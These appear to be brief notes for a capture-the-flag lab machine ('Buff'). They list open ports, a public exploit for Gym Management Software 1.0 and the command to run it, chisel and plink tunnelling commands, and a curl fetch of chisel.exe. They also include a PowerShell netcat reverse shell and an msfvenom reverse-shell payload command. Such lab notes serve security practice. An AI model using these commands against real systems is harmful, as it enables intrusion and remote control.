# Buff
```
Export IP=10.10.10.198
```

##SCAN
```
Open 10.10.10.198:7680
Open 10.10.10.198:8080
```

##Vulerable
```
[*] CMS : Gym Management Software 1.0
[*] Exploit PoC : https://www.exploit-db.com/exploits/48506
[*] Usage : python2 48506.py "http://{Export IP:PORT}"

```

##chisel tunneling
```
1. curl -O "http://{MYSERVER}/chisel.exe"

2. Usage chisel
- client :  chisel.exe client 10.10.14.100:8080 R:8888:10.10.10.198:8888
- server : chisel.exe server -p 8080 --reverse
```

## ReverShell
```
powershell -c ".\nc.exe 10.10.14.100 1234 -e powershell"


./linchisel server -p 8080 --reverse

PS> ./winchisel.exe client 10.10.14.100:9001 R:8888:localhost:8888


./plink.exe -l root -pw 1234 10.10.14.100 -R 8888:127.0.0.1:8888
```

## Payload Gen
```
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.100 LPORT=9001 -b "\x00\x0A\x0D" -f python
```

